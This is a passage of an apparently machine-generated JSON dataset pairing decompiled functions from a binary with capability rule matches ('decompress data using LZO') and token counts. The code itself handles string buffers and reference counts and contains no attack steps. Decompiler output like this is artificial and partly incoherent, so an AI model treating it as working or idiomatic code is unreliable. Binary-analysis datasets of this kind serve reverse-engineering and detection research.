        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00474c30(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    uVar3 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x24) = uVar3;\n    uVar3 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x25) = uVar3;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 100) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar4 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar4, iVar2, 0);\n    *(arg_10h + 0xc) = iVar2;\n    *(iVar4 + iVar2) = 0;\n    *(arg_10h + 8) = iVar4;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar4 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar4, iVar2, 0);\n    *(arg_10h + 0x18) = iVar2;\n    *(iVar4 + iVar2) = 0;\n    iVar2 = *0x4f59f4;\n    *(arg_10h + 0x14) = iVar4;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    iVar4 = *0x4f59f4;\n    *(arg_10h + 0x1c) = iVar5;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 0x20) = iVar2;\n    if (iVar4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0046bf60(&var_1dh);\n    return;\n}\n",
        "token_count": 934
    },
    "00474e60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00474e60(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x24) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x25) = uVar1;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 100) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar2, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar2;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar2, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar2;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = fcn.004a34e0(var_2ch + 1);\n    fcn.00435590(iVar2, var_2ch, 0);\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar2;\n    *(arg_10h + 0x20) = var_2ch;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return;\n}\n",
        "token_count": 619
    },
    "00474fd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n\nvoid __cdecl\nfcn.00474fd0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t *var_ch_2;\n    int32_t var_10h_2;\n    uint var_ch;\n    uint var_10h;\n    uint var_2ch;\n    uint var_1ch;\n    uchar uStack249;\n    int32_t iStack248;\n    uchar *puStack232;\n    int32_t *piStack228;\n    int32_t *piStack224;\n    uchar *puStack220;\n    uchar *puStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int32_t iStack204;\n    int32_t iStack200;\n    int32_t *piStack196;\n    uint uStack192;\n    int32_t iStack172;\n    int32_t *piStack168;\n    uchar *puStack156;\n    int32_t *piStack152;\n    uchar auStack148 [28];\n    int32_t iStack120;\n    int32_t *piStack116;\n    uchar *puStack112;\n    uchar *puStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    int32_t *piStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    uint var_3ch_2;\n    int32_t var_30h_2;\n    int32_t var_2ch_3;\n    uint var_3ch;\n    uchar var_1dh_3;\n    int32_t var_30h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_1ch_2;\n    \n    iStack80 = 0x474fe6;\n    uVar5 = (**(*var_ch_2 + 8))();\n    *(var_10h_2 + 0x24) = uVar5;\n    iStack80 = 0x474ff1;\n    uVar5 = (**(*var_ch_2 + 0xc))();\n    *(var_10h_2 + 8) = 0;\n    *(var_10h_2 + 0x26) = uVar5;\n    iVar6 = *var_ch_2;\n    *(var_10h_2 + 0x14) = 0;\n    *(var_10h_2 + 0x1c) = 0;\n    *(var_10h_2 + 0xa4) = 1;\n    piStack76 = var_ch_2;\n    iStack80 = 0x47501c;\n    (**(iVar6 + 0x10))();\n    iVar6 = *(var_30h + -0xc);\n    iStack80 = iVar6 + 1;\n    uStack84 = 0x475030;\n    iStack80 = fcn.004a34e0();\n    uStack72 = 0;\n    uStack84 = 0x47504a;\n    piStack76 = iVar6;\n    var_2ch_3 = iStack80;\n    fcn.0042ca00();\n    *(var_10h_2 + 0xc) = iVar6;\n    *(var_2ch_3 + iVar6) = 0;\n    *(var_10h_2 + 8) = var_2ch_3;\n    if (*0x4f59f4 == 0) {\n        iVar6 = *(var_30h + -4);\n        *(var_30h + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = var_30h + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        puStack92 = &stack0xffffffdf;\n        piStack96 = 0x4751a0;\n        fcn.0046bf60();\n    }\n    piStack96 = var_ch_2;\n    puStack100 = 0x475086;\n    (**(*var_ch_2 + 0x14))();\n    var_2ch_3 = *(var_30h + -0xc);\n    uVar11 = var_2ch_3 + 1;\n    if (uVar11 < 0x3fffffff) {\n        puStack100 = uVar11 * 2;\n        iStack104 = 0x4750af;\n        var_30h_2 = puStack100;\n        iVar6 = fcn.004a34e0();\n        puStack92 = NULL;\n        piStack96 = var_2ch_3;\n        iStack104 = 0x4750cb;\n        puStack100 = iVar6;\n        fcn.0042bb20();\n        *(var_10h_2 + 0x14) = iVar6;\n        *(iVar6 + -2 + var_30h_2) = 0;\n        *(var_10h_2 + 0x18) = var_2ch_3;\n        if (*0x4f59f4 == 0) {\n            iVar6 = *(var_30h + -4);\n            *(var_30h + -4) = iVar6 + -1;\n        }\n        else {\n            LOCK();\n            piVar10 = var_30h + -4;\n            iVar6 = *piVar10;\n            *piVar10 = *piVar10 + -1;\n        }\n        if (iVar6 < 1) {\n            puStack112 = &stack0xffffffdf;\n            piStack116 = 0x4751d0;\n            fcn.004640a0();\n        }\n        piStack116 = var_ch_2;\n        iStack120 = 0x47510d;\n        (**(*var_ch_2 + 0x18))();\n        uVar11 = *(var_30h + -0xc);\n        var_ch_2 = uVar11 + 1;\n        if (var_ch_2 < 0x3fffffff) {\n            puStack100 = 0x47512f;\n            piStack96 = var_ch_2 * 2;\n            piStack96 = fcn.004a34e0();\n            uStack88 = 0;\n            puStack100 = 0x475149;\n            puStack92 = uVar11;\n            var_2ch_3 = piStack96;\n            fcn.0042bb20();\n            *(var_10h_2 + 0x20) = uVar11;\n            *(var_10h_2 + 0x1c) = var_2ch_3;\n            iVar6 = *0x4f59f4;\n            *(var_2ch_3 + -2 + var_ch_2 * 2) = 0;\n            if (iVar6 == 0) {\n                iVar6 = *(var_30h + -4);\n                *(var_30h + -4) = iVar6 + -1;\n            }\n            else {\n                LOCK();\n                piVar10 = var_30h + -4;\n                iVar6 = *piVar10;\n                *piVar10 = *piVar10 + -1;\n            }\n            if (0 < iVar6) {\n                return;\n            }\n            puStack108 = &stack0xffffffdf;\n            puStack112 = 0x4751fc;\n            fcn.004640a0();\n            return;\n        }\n        puStack100 = 0x47521d;\n        fcn.004a3c30();\n        piStack96 = &stack0xffffffdf;\n        puStack100 = 0x47522e;\n        fcn.0046bf80();\n        puStack100 = var_10h_2;\n        iStack104 = 0x475237;\n        fcn.0041b360();\n    }\n    else {\n        iStack104 = 0x475210;\n        var_10h_2 = fcn.004a3c30();\n    }\n    puStack100 = &stack0xffffffdf;\n    iStack104 = 0x475248;\n    fcn.004640c0();\n    puStack108 = 0x475251;\n    iStack104 = var_10h_2;\n    fcn.0041b360();\n    puVar3 = puStack92;\n    piVar10 = piStack96;\n    iStack200 = 0x475276;\n    iStack120 = var_10h_2;\n    piStack116 = var_ch_2;\n    puStack112 = uVar11;\n    puStack108 = &stack0xfffffffc;\n    uVar5 = (**(*piStack96 + 8))();\n    *(puVar3 + 0x24) = uVar5;\n    iStack200 = 0x475281;\n    uVar5 = (**(*piVar10 + 0xc))();\n    *(puVar3 + 8) = 0;\n    *(puVar3 + 0x26) = uVar5;\n    iVar6 = *piVar10;\n    *(puVar3 + 0x14) = 0;\n    *(puVar3 + 0x1c) = 0;\n    puVar3[0xa4] = 1;\n    piStack196 = piVar10;\n    iStack200 = 0x4752ac;\n    (**(iVar6 + 0x10))();\n    piVar1 = piStack152;\n    iStack200 = piStack152 + 1;\n    iStack204 = 0x4752bd;\n    iStack200 = fcn.004a34e0();\n    uStack192 = 0;\n    piStack196 = piVar1;\n    iStack204 = 0x4752d7;\n    piStack168 = iStack200;\n    fcn.00435590();\n    *(puVar3 + 0xc) = piVar1;\n    *(piStack168 + piVar1) = 0;\n    *(puVar3 + 8) = piStack168;\n    if (puStack156 != &stack0xffffff6c) {\n        piStack212 = puStack156;\n        puStack216 = 0x4752f9;\n        fcn.004a34c0();\n    }\n    piStack212 = piVar10;\n    puStack216 = 0x475304;\n    (**(*piVar10 + 0x14))();\n    piStack224 = piStack152 + 1;\n    piStack168 = piStack152;\n    if (piStack224 < 0x3fffffff) {\n        puStack216 = piStack224 * 2;\n        puStack220 = 0x47532a;\n        iStack172 = puStack216;\n        iVar6 = fcn.004a34e0();\n        piStack208 = NULL;\n        piStack212 = piStack168;\n        puStack220 = 0x475346;\n        puStack216 = iVar6;\n        fcn.00436340();\n        *(puVar3 + 0x14) = iVar6;\n        *(puVar3 + 0x18) = piStack168;\n        *(iVar6 + -2 + iStack172) = 0;\n        if (puStack156 != &stack0xffffff6c) {\n            piStack228 = puStack156;\n            puStack232 = 0x47536e;\n            fcn.004a34c0();\n        }\n        piStack228 = piVar10;\n        puStack232 = 0x475379;\n        (**(*piVar10 + 0x18))();\n        piVar10 = piStack152 + 1;\n        piStack224 = piStack152;\n        if (piVar10 < 0x3fffffff) {\n            puStack220 = 0x475394;\n            puStack216 = piVar10 * 2;\n            puStack216 = fcn.004a34e0();\n            piStack208 = NULL;\n            piStack212 = piStack152;\n            puStack220 = 0x4753ae;\n            piStack168 = puStack216;\n            fcn.00436340();\n            *(puVar3 + 0x20) = piStack152;\n            *(piStack168 + -2 + piVar10 * 2) = 0;\n            *(puVar3 + 0x1c) = piStack168;\n            if (puStack156 != &stack0xffffff6c) {\n                piStack228 = puStack156;\n                puStack232 = 0x4753d3;\n                fcn.004a34c0();\n            }\n            return;\n        }\n    }\n    else {\n        puStack220 = 0x4753ec;\n        fcn.004a3c30();\n    }\n    puStack220 = 0x4753f1;\n    fcn.004a3c30();\n    if (puStack156 != &stack0xffffff6c) {\n        puStack216 = puStack156;\n        puStack220 = 0x475403;\n        fcn.004a34c0();\n    }\n    puStack216 = puVar3;\n    puStack220 = 0x47540b;\n    fcn.0041b360();\n    iVar2 = iStack204;\n    piVar1 = piStack208;\n    puStack232 = puVar3;\n    piStack228 = piVar10;\n    puStack220 = &stack0xffffff94;\n    uVar4 = (**(*piStack208 + 8))();\n    *(iVar2 + 0x11) = uVar4;\n    uVar4 = (**(*piVar1 + 0xc))();\n    *(iVar2 + 0x12) = uVar4;\n    uVar7 = (**(*piVar1 + 0x20))();\n    *(iVar2 + 8) = 0;\n    *(iVar2 + 0x2c) = uVar7;\n    *(iVar2 + 0x14) = 0;\n    *(iVar2 + 0x1c) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(iVar2 + 0x43) = 1;\n    (**(*piVar1 + 0x10))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar2 + 0xc) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar2 + 8) = iVar8;\n    if (*0x4f59f4 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x14))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar2 + 0x18) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar2 + 0x14) = iVar8;\n    if (*0x4f59f4 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x18))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar2 + 0x20) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    iVar6 = *0x4f59f4;\n    *(iVar2 + 0x1c) = iVar8;\n    if (iVar6 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x1c))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar9 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar9, iVar6, 0);\n    iVar8 = *0x4f59f4;\n    *(iVar2 + 0x28) = iVar6;\n    *(iVar9 + iVar6) = 0;\n    *(iVar2 + 0x24) = iVar9;\n    if (iVar8 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff07);\n    }\n    uVar7 = (**(*piVar1 + 0x24))();\n    *(iVar2 + 0x30) = uVar7;\n    uVar7 = (**(*piVar1 + 0x28))();\n    *(iVar2 + 0x34) = uVar7;\n    return;\n}\n",
        "token_count": 4361
    },
    "00475260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid __cdecl\nfcn.00475260(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uchar uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *var_ch;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar uStack145;\n    int32_t iStack144;\n    int32_t iStack128;\n    int32_t *piStack124;\n    int32_t *piStack120;\n    uchar *puStack116;\n    uint *puStack112;\n    int32_t *piStack108;\n    int32_t *piStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t *piStack92;\n    uint uStack88;\n    int32_t var_40h;\n    int32_t *var_3ch_2;\n    uint *var_30h_2;\n    int32_t *var_2ch_2;\n    uint var_28h_2;\n    uint var_ch_2;\n    \n    iStack96 = 0x475276;\n    uVar5 = (**(*var_ch + 8))();\n    *(noname_2 + 0x24) = uVar5;\n    iStack96 = 0x475281;\n    uVar5 = (**(*var_ch + 0xc))();\n    *(noname_2 + 8) = 0;\n    *(noname_2 + 0x26) = uVar5;\n    iVar6 = *var_ch;\n    *(noname_2 + 0x14) = 0;\n    *(noname_2 + 0x1c) = 0;\n    *(noname_2 + 0xa4) = 1;\n    piStack92 = var_ch;\n    iStack96 = 0x4752ac;\n    (**(iVar6 + 0x10))();\n    piVar2 = var_2ch_2;\n    iStack96 = var_2ch_2 + 1;\n    iStack100 = 0x4752bd;\n    iStack96 = fcn.004a34e0();\n    uStack88 = 0;\n    piStack92 = piVar2;\n    iStack100 = 0x4752d7;\n    var_3ch_2 = iStack96;\n    fcn.00435590();\n    *(noname_2 + 0xc) = piVar2;\n    *(var_3ch_2 + piVar2) = 0;\n    *(noname_2 + 8) = var_3ch_2;\n    if (var_30h_2 != &fcn.00475260::var_28h_2) {\n        piStack108 = var_30h_2;\n        puStack112 = 0x4752f9;\n        fcn.004a34c0();\n    }\n    piStack108 = var_ch;\n    puStack112 = 0x475304;\n    (**(*var_ch + 0x14))();\n    piStack120 = var_2ch_2 + 1;\n    var_3ch_2 = var_2ch_2;\n    if (piStack120 < 0x3fffffff) {\n        puStack112 = piStack120 * 2;\n        puStack116 = 0x47532a;\n        var_40h = puStack112;\n        iVar6 = fcn.004a34e0();\n        piStack104 = NULL;\n        piStack108 = var_3ch_2;\n        puStack116 = 0x475346;\n        puStack112 = iVar6;\n        fcn.00436340();\n        *(noname_2 + 0x14) = iVar6;\n        *(noname_2 + 0x18) = var_3ch_2;\n        *(iVar6 + -2 + var_40h) = 0;\n        if (var_30h_2 != &fcn.00475260::var_28h_2) {\n            piStack124 = var_30h_2;\n            iStack128 = 0x47536e;\n            fcn.004a34c0();\n        }\n        piStack124 = var_ch;\n        iStack128 = 0x475379;\n        (**(*var_ch + 0x18))();\n        var_ch = var_2ch_2 + 1;\n        piStack120 = var_2ch_2;\n        if (var_ch < 0x3fffffff) {\n            puStack116 = 0x475394;\n            puStack112 = var_ch * 2;\n            puStack112 = fcn.004a34e0();\n            piStack104 = NULL;\n            piStack108 = var_2ch_2;\n            puStack116 = 0x4753ae;\n            var_3ch_2 = puStack112;\n            fcn.00436340();\n            *(noname_2 + 0x20) = var_2ch_2;\n            *(var_3ch_2 + -2 + var_ch * 2) = 0;\n            *(noname_2 + 0x1c) = var_3ch_2;\n            if (var_30h_2 != &fcn.00475260::var_28h_2) {\n                piStack124 = var_30h_2;\n                iStack128 = 0x4753d3;\n                fcn.004a34c0();\n            }\n            return;\n        }\n    }\n    else {\n        puStack116 = 0x4753ec;\n        fcn.004a3c30();\n    }\n    puStack116 = 0x4753f1;\n    fcn.004a3c30();\n    if (var_30h_2 != &fcn.00475260::var_28h_2) {\n        puStack112 = var_30h_2;\n        puStack116 = 0x475403;\n        fcn.004a34c0();\n    }\n    puStack112 = noname_2;\n    puStack116 = 0x47540b;\n    fcn.0041b360();\n    iVar3 = iStack100;\n    piVar2 = piStack104;\n    iStack128 = noname_2;\n    piStack124 = var_ch;\n    puStack116 = &stack0xfffffffc;\n    uVar4 = (**(*piStack104 + 8))();\n    *(iVar3 + 0x11) = uVar4;\n    uVar4 = (**(*piVar2 + 0xc))();\n    *(iVar3 + 0x12) = uVar4;\n    uVar7 = (**(*piVar2 + 0x20))();\n    *(iVar3 + 8) = 0;\n    *(iVar3 + 0x2c) = uVar7;\n    *(iVar3 + 0x14) = 0;\n    *(iVar3 + 0x1c) = 0;\n    *(iVar3 + 0x24) = 0;\n    *(iVar3 + 0x43) = 1;\n    (**(*piVar2 + 0x10))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar3 + 0xc) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar3 + 8) = iVar8;\n    if (*0x4f59f4 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x14))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar3 + 0x18) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar3 + 0x14) = iVar8;\n    if (*0x4f59f4 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x18))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar8 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar8, iVar6, 0);\n    *(iVar3 + 0x20) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    iVar6 = *0x4f59f4;\n    *(iVar3 + 0x1c) = iVar8;\n    if (iVar6 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff6f);\n    }\n    (**(*piVar2 + 0x1c))(piVar2);\n    iVar6 = *(iStack144 + -0xc);\n    iVar9 = fcn.004a34e0(iVar6 + 1);\n    fcn.0042ca00(iVar9, iVar6, 0);\n    iVar8 = *0x4f59f4;\n    *(iVar3 + 0x28) = iVar6;\n    *(iVar9 + iVar6) = 0;\n    *(iVar3 + 0x24) = iVar9;\n    if (iVar8 == 0) {\n        iVar6 = *(iStack144 + -4);\n        *(iStack144 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack144 + -4;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0046bf60(&stack0xffffff6f);\n    }\n    uVar7 = (**(*piVar2 + 0x24))();\n    *(iVar3 + 0x30) = uVar7;\n    uVar7 = (**(*piVar2 + 0x28))();\n    *(iVar3 + 0x34) = uVar7;\n    return;\n}\n",
        "token_count": 2776
    },
    "00475410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid fcn.00475410(uint param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *var_ch;\n    int32_t var_10h;\n    uint var_2ch_2;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch_2;\n    \n    uVar3 = (**(*var_ch + 8))();\n    *(var_10h + 0x11) = uVar3;\n    uVar3 = (**(*var_ch + 0xc))();\n    *(var_10h + 0x12) = uVar3;\n    uVar4 = (**(*var_ch + 0x20))();\n    *(var_10h + 8) = 0;\n    *(var_10h + 0x2c) = uVar4;\n    *(var_10h + 0x14) = 0;\n    *(var_10h + 0x1c) = 0;\n    *(var_10h + 0x24) = 0;\n    *(var_10h + 0x43) = 1;\n    (**(*var_ch + 0x10))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(var_10h + 0xc) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(var_10h + 8) = iVar5;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*var_ch + 0x14))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(var_10h + 0x18) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    *(var_10h + 0x14) = iVar5;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*var_ch + 0x18))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar5, iVar2, 0);\n    *(var_10h + 0x20) = iVar2;\n    *(iVar5 + iVar2) = 0;\n    iVar2 = *0x4f59f4;\n    *(var_10h + 0x1c) = iVar5;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    (**(*var_ch + 0x1c))(var_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar6 = fcn.004a34e0(iVar2 + 1);\n    fcn.0042ca00(iVar6, iVar2, 0);\n    iVar5 = *0x4f59f4;\n    *(var_10h + 0x28) = iVar2;\n    *(iVar6 + iVar2) = 0;\n    *(var_10h + 0x24) = iVar6;\n    if (iVar5 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0046bf60(&var_1dh);\n    }\n    uVar4 = (**(*var_ch + 0x24))();\n    *(var_10h + 0x30) = uVar4;\n    uVar4 = 